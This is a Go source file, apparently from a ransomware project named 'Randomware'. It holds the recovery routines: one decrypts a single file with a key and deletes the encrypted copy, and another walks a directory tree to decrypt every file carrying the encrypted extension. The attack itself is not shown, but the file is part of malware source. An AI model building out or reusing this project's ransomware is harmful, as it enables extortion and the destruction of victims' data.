package file

import (
	"Randomware/encryption"
	"os"
)

// Decrypt : decrypts file with key
func Decrypt(fileSrc string, key *[]byte) (string, error) {

	decryptedFileName := fileSrc[0 : len(fileSrc)-len(EncryptedExt)]
	encryptedFile, err := os.Open(fileSrc)

	counter := []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}

	if err != nil {
		return "", err
	}

	fi, err := encryptedFile.Stat()

	if err != nil {
		return "", err
	}

	//Reads Data from file
	var i int64
	data := make([]byte, MaxSize)
	iterations := fi.Size() / int64(MaxSize)

	//Creates decrypted File
	decryptedFile, err := os.Create(decryptedFileName)

	if err != nil {
		return "", err
	}

	defer decryptedFile.Close()

	//Decrypts chunks of MaxSize data to encrypted file
	for i = 0; i < iterations; i++ {
		encryptedFile.Read(data)
		encryption.Decrypt(&data, key, &counter)
		_, err = decryptedFile.Write(data)
		if err != nil {
			return "", err
		}

		decryptedFile.Sync()
	}

	//Decrypts remaining of file (less then MaxSize)
	if fi.Size()%int64(MaxSize) != 0 {
		data = make([]byte, fi.Size()-iterations*int64(MaxSize))
		encryptedFile.Read(data)
		encryption.Decrypt(&data, key, &counter)
		_, err = decryptedFile.Write(data)
		if err != nil {
			return "", err
		}

		decryptedFile.Sync()
	}

	encryptedFile.Close()

	os.Remove(fileSrc)

	return decryptedFileName, nil
}

// DecryptAll : encrypts all files from root directory all subdirectories
func DecryptAll(rootFolder string, key *[]byte) (uint64, error) {
	var decryptedFilesNbr uint64 = 0
	files, err := DiscoverFiles(rootFolder)
	if err != nil {
		return decryptedFilesNbr, err
	}
	for _, file := range files {
		if file[len(file)-len(EncryptedExt):] == EncryptedExt {
			_, err := Decrypt(file, key)
			if err == nil {
				decryptedFilesNbr++
			}
		}
	}
	return decryptedFilesNbr, nil
}
